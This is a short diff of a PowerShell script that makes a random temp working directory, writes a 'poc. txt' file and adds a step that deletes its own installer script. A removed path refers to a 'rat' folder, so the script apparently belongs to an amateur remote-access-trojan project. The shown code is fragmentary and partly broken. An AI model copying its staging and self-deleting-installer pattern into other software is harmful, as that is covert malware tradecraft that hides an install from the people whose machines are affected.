@@ -16,15 +16,16 @@
 
 $wd = random_text
 $path = "$env:temp/$wd"
-echo $path
+$initial_dir = %cd%
 
 #goto temp ,make working directory
 
  mkdir $path 
  cd $path 
  echo "" > poc. txt
- cd C:\Users\lange\Desktop\rat\files
+ cd $initial_dir
  
+ del insatller.ps1
 
 
 
